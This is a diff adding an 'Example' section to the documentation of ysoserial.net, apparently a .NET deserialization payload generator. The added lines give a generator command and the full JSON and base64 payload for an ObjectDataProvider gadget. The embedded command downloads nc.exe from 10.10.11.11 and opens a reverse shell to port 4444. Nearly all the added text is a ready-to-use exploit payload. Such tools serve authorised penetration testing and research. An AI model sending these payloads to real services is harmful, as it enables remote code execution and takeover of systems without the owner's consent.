@@ -75,3 +75,21 @@ Options:
   -h, --help                 Shows this message and exit.  
       --credit               Shows the credit/history of gadgets and plugins
                                (other parameters will be ignored).  
+## Example
+
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c "curl http://10.10.11.11/nc.exe -o nc.exe & nc.exe 10.10.11.11 4444 -e cmd.exe"  
+
+{
+    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName":"Start",
+    "MethodParameters":{
+        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+        "$values":["cmd", "/c curl http://10.10.11.11/nc.exe -o nc.exe & nc.exe 10.10.11.11 4444 -e cmd.exe"]
+    },
+    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
+}
+
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c "curl http://10.10.11.11/nc.exe -o nc.exe & nc.exe 10.10.11.11 4444 -e cmd.exe" -o base64  
+
+ewogICAgIiR0eXBlIjoiU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUiLCAKICAgICJNZXRob2ROYW1lIjoiU3RhcnQiLAogICAgIk1ldGhvZFBhcmFtZXRlcnMiOnsKICAgICAgICAiJHR5cGUiOiJTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkiLAogICAgICAgICIkdmFsdWVzIjpbImNtZCIsICIvYyBjdXJsIGh0dHA6Ly8xMC4xMC4xMS4xMS9uYy5leGUgLW8gbmMuZXhlICYgbmMuZXhlIDEwLjEwLjExLjExIDQ0NDQgLWUgY21kLmV4ZSJdCiAgICB9LAogICAgIk9iamVjdEluc3RhbmNlIjp7IiR0eXBlIjoiU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkifQp9
+
